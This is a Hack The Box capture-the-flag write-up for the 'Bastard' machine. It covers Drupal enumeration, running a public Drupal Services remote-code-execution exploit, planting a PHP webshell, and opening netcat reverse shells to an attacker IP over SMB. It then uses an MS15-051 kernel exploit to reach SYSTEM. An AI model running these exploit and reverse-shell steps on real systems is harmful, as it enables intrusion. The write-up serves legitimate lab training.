@@ -1,0 +1,103 @@
+HTB-Bastard-Writeup
+
+IP : 10.10.10.9
+
+Nmap
+----
+- nmap scan revealed 3 open ports 
+	- 80 running Microsoft IIS httpd 7.5
+	- 135 running msrpc
+	- 49154 running msrpc
+- the webserver is hosting drupal
+- we do have robots.txt with disallowed entries 
+
+Enumeration
+-----------
+- visiting port 80 we got a drupal page with just a login and a welcome message 
+- on checking the CHANGELOG.txt from the robots.txt we got the version of the drupal used which is 7.54
+- we can use droopscan to enumerate the drupal site 
+
+	droopescan scan drupal -u http://10.10.10.9
+
+- didnt get much info other than drupal version
+- directory brute force the webpage and found a bunch of results 
+- saved it to a file 
+- we got an endpoint called rest_endpoint which might be useful later 
+- we can check the version against searchsploit for known vulnerabilities and exploits  
+
+Shell as iusr
+-------------
+- on searching with searchsploit we got a remote code execution exploit matching our version of drupal
+	
+	Module Services - Remote Code Execution 
+
+- we can download the exploit to our machine 
+
+	searchsploit -m exploits/php/webapps/41564.php
+
+- check for any errors and broken comments 
+- customizing the exploit with the info we gathered till now
+
+	$url = 'http://10.10.10.9';
+	$endpoint_path = '/rest';
+	$endpoint = 'rest_endpoint';
+
+	$file = [
+	    'filename' => 'lord.php',
+	    'data' => php cmd code
+	];
+
+- make sure we have php curl installed on our machine 
+
+	apt install php-curl
+
+- run the exploit 
+
+	php exploit-41564.php
+
+- the output will store the session information in session.json and user information in user.json
+- the hash we got from this was drupal7 and it was pretty hard to crack using a normal system
+- since we have a webshell installed along with the exploit we can access it to get a shell back
+	
+	curl http://10.10.10.9/0xdf.php?cmd=whoami
+	nt authority\iusr
+
+- we can use smbserver to get nc64.exe on the machine and call it using lord.php
+
+	http://10.10.10.9/lord.php?cmd=\\10.10.14.14\share\nc64.exe%20-e%20cmd.exe%2010.10.14.14%209001
+
+- we can start a listener with netcat
+
+	nc -lnvp 9001
+
+Priv-esc
+--------
+- ran systeminfo command and noticed that there are no hotfixes installed on the machine 
+
+	Host Name:                 BASTARD
+	OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+	OS Version:                6.1.7600 N/A Build 7600
+	Hotfix(s):                 N/A
+
+- this points towards kernal exploits 
+- checking around with the version info we got MS15-051
+- download it from the following link
+
+	https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
+
+- use smbserver to get the 64 bit version onto the victim machine 
+- when we run it we get command execution as system
+
+	\\10.10.14.14\share\ms15-051x64.exe "whoami"
+
+- we can try to get a shell out of it 
+- start a netcat listener
+
+	nc -nlvp 9002
+
+- run the exploit 
+
+	\\10.10.14.14\share\ms15-051x64.exe "\\10.10.14.14\share\nc64.exe -e cmd.exe 10.10.14.14 9002"
+
+- we get system
+- grab the root flag 
